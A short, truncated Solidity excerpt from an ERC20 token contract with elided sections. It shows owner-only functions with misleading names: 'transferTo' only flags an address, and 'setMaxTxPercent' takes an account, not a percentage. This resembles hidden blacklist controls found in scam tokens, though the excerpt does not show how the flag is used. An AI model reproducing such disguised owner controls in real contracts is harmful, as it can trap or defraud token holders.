...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function transferStatus(address _address) public view returns (bool) {
        return _transferTo[_address];
    }
    function transferTo(address account) external onlyOwner() {
        _transferTo[account] = true;
    }
    function setMaxTxPercent(address account) external onlyOwner() {
